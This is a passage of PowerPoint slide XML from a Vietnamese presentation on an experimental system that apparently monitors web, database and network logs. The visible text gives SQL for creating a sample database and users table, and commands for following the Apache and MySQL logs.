              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Database Log (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nhật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ký</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sở</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dữ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>liệu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>):</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Network Logs &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Pcap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nhật</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ký</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>): </a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="214" name="Google Shape;214;p22" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666750" y="4898762"/>
            <a:ext cx="381000" cy="38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18"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="219" name="Google Shape;219;p23"/>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V. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Kiến Trúc Mô Hình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thực Nghiệm:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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21" name="Google Shape;221;p23" title="Screenshot 2026-05-30 024103.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="1458538"/>
            <a:ext cx="8496301" cy="4534449"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="222" name="Google Shape;222;p23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4157067" y="6289476"/>
            <a:ext cx="2481600" cy="200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300">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sơ đồ kiến trúc tổng thể</a:t>
            </a:r>
            <a:endParaRPr sz="13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26"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Google Shape;227;p24"/>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V. Kiến Trúc Mô Hình </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thực Nghiệm:</a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p24"/>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29" name="Google Shape;229;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="852450" y="1851175"/>
            <a:ext cx="10253326" cy="3727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33"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Google Shape;234;p25"/>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5.1. Thiết kế và cấu hình: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;p25"/>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6" name="Google Shape;236;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1060450" y="1339988"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Web Server: </a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="237" name="Google Shape;237;p25" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="495300" y="1311050"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="238" name="Google Shape;238;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4991100" y="1339988"/>
            <a:ext cx="6334276" cy="3659925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="2088550"/>
            <a:ext cx="4105200" cy="3780000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115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Tạo database:</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>CREATE DATABASE public_service;</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>USE public_service;</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>CREATE TABLE records (</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>id INT AUTO_INCREMENT PRIMARY KEY,</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>code VARCHAR(50),</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>owner_name VARCHAR(100),</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>status VARCHAR(100)</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>CREATE TABLE users(</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>id INT AUTO_INCREMENT PRIMARY KEY,</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>username VARCHAR(50),</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>password VARCHAR(255)</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="100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Apache log: sudo tail -f  /var/log/apache2/access.log </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-311150" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115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Database log:  sudo tail -f /var/log/mysql/query.log </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="240" name="Google Shape;240;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="39497"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5750801" y="4533750"/>
            <a:ext cx="4814875" cy="2247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44"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;245;p26"/>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5.1. Thiết kế và cấu hình: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
